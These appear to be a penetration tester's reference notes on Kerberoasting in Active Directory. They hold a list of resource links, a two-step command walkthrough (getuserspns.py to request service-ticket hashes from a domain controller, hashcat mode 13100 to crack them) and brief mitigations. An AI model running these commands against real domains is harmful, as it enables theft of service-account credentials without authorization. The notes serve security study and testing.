# Kerberoasting

## Resources

* [https://medium.com/@Shorty420/kerberoasting-9108477279cc](https://medium.com/@Shorty420/kerberoasting-9108477279cc)
* [https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf](https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf)
* [https://www.youtube.com/watch?v=LmbP-XD1SC8\&t=30s\&ab\_channel=SANSOffensiveOperations](https://www.youtube.com/watch?v=LmbP-XD1SC8\&t=30s\&ab\_channel=SANSOffensiveOperations)
* [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
* [https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)
* [https://www.varonis.com/blog/kerberos-authentication-explained/](https://www.varonis.com/blog/kerberos-authentication-explained/)
* [https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)
* [https://www.hackingarticles.in/kerberoasting-and-pass-the-ticket-attack-using-linux/](https://www.hackingarticles.in/kerberoasting-and-pass-the-ticket-attack-using-linux/)
* [https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)
* [https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/Invoke-Kerberoast.ps1)

![](<../../../.gitbook/assets/Kerberoasting Overview.png>)

## Kerberoasting Attack Overview

#### Step 1: Get SPNs (Service Principal Name), Dump Hash

```bash
python getuserspns.py <DOMAIN/username:password> -dc-ip <ip of DC> -request
```

#### Step 2: Crack the Hash

```bash
hashcat --help | grep Kerberos
hashcat -m 13100 kerberoasthash.txt rockyou.txt
```

## Mitigation

* strong passwords
* least privilege
